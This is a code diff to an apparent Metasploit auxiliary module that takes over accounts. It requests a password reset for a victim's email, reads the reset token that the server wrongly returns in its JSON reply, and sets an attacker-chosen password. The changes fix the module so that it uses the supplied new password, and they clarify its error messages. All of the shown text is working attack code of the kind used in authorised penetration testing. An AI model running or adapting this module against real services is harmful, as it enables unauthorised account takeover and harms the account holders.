@@ -83,15 +83,18 @@ class MetasploitModule < Msf::Auxiliary
           'Content-Type' => 'application/json'
         },
         'data' => {
-          'user' => { email: email.to_s }
+          'user' => {
+            email: email
+          }
         }.to_json
       }
     )
-    fail_with(Failure::Unknown, 'Unexpected server reply.') unless res && res.code == 201
+
+    fail_with(Failure::Unknown, 'Unexpected server reply while requesting reset token.') unless res && res.code == 201
     res.get_json_document['user']['tempToken']
   end
 
-  def reset_password(email, token, _password)
+  def reset_password(email, token, password)
     res = send_request_cgi(
       {
         'method' => 'POST',
@@ -100,22 +103,25 @@ class MetasploitModule < Msf::Auxiliary
           'Content-Type' => 'application/json'
         },
         'data' => {
-          'user' => { 'email' => email.to_s, 'tempToken' => token.to_s, 'password' => 'password' }
+          'user' => { 'email' => email, 'tempToken' => token, 'password' => password }
         }.to_json
       }
     )
-    fail_with(Failure::Unknown, 'Unexpected server reply.') unless res && res.code == 201
+    fail_with(Failure::Unknown, 'Unexpected server reply while resetting password.') unless res && res.code == 201
   end
 
   def run
     email = datastore['EMAIL']
-    reset_token = get_reset_token(email)
     new_password = datastore['NEWPASSWORD']
+
+    # Request reset token
+    reset_token = get_reset_token(email)
 
     if reset_token.empty?
       fail_with(Failure::UnexpectedReply, 'Could not retrieve password reset token for victim email address.')
     end
 
+    # Reset user password
     reset_password(email, reset_token, new_password)
 
     loot = {
